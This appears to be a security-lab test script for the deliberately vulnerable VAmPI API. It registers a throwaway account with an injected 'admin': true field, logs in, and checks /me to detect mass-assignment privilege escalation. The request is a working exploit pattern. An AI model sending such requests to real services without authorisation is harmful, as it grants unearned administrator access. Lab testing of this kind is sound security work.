#!/usr/bin/env python3
"""
vampi_challenge_04_mass_assignment_admin.py — Mass Assignment (register role).

VAmPI's register endpoint accepts an `admin` field in the request body and
applies it to the new account. We register a throwaway user WITH admin:true,
log in, and check GET /me. If the new account reports admin=true, that's the
mass-assignment / broken access-control pattern (privilege escalation on
signup).

Creates only a throwaway account — safe to re-run.
Run: python3 vampi_challenge_04_mass_assignment_admin.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="Mass assignment: register with admin:true")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)

    username = vc.rand_username("massadmin")
    password = "TestPass123!"
    email = vc.rand_email(username)

    # 1. Register WITH an admin flag in the body.
    r = requests.post(f"{base}/users/v1/register",
                      json={"username": username, "password": password,
                            "email": email, "admin": True},
                      headers={**vc.consumer_headers(804), "Content-Type": "application/json"}, timeout=tout)
    d = r.json() if r.status_code != 204 else {}
    print(f"register (admin:true) -> HTTP {r.status_code} status={d.get('status')} as {username}")

    # 2. Log in as the new account.
    token = vc.login(base, username, password, vc.consumer_headers(804), tout)
    if not token:
        print("login for mass-assigned account failed")
        return

    # 3. Check whether the account actually has the admin flag.
    r = requests.get(f"{base}/me", headers=vc.auth_headers(token), timeout=tout)
    data = (r.json() or {}).get("data", {}) if r.status_code != 204 else {}
    admin = data.get("admin")
    print(f"GET /me -> HTTP {r.status_code} admin={admin}")
    if admin is True:
        print("[FINDING] new account was created WITH admin privileges (mass assignment succeeded).")
    else:
        print("[ok] admin flag was not applied to the new account.")


if __name__ == "__main__":
    main()
